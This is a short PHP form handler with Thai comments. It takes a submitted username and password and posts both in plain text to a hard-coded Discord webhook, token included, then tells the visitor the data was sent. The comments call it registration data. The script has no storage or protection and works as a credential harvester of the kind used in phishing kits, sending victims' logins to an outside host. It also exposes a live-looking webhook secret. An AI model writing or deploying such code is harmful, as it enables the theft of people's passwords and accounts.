<?php
// รับข้อมูลจากฟอร์ม
$username = $_POST['username'];
$password = $_POST['password'];

// ส่งข้อมูลไปยัง Discord Webhook
$webhook_url = "https://discord.com/api/webhooks/1312102853791187086/K3qnve_v8w_WFzwxJaBixKWPFKFm_2z_a4akH8jfN0HgFuuqFj8gfMz94AHBz2WL9DNa";  // เปลี่ยนเป็น Webhook ของคุณ

// ข้อมูลที่จะแสดงใน Discord
$data = [
    "content" => "ข้อมูลสมัครสมาชิก:\nชื่อผู้ใช้: $username\nรหัสผ่าน: $password",
];

// ส่งข้อมูลไปยัง Webhook
$options = [
    "http" => [
        "header" => "Content-Type: application/json\r\n",
        "method" => "POST",
        "content" => json_encode($data),
    ],
];
$context = stream_context_create($options);
file_get_contents($webhook_url, false, $context);

echo "ข้อมูลได้ถูกส่งไปยัง Webhook แล้ว!";
?>
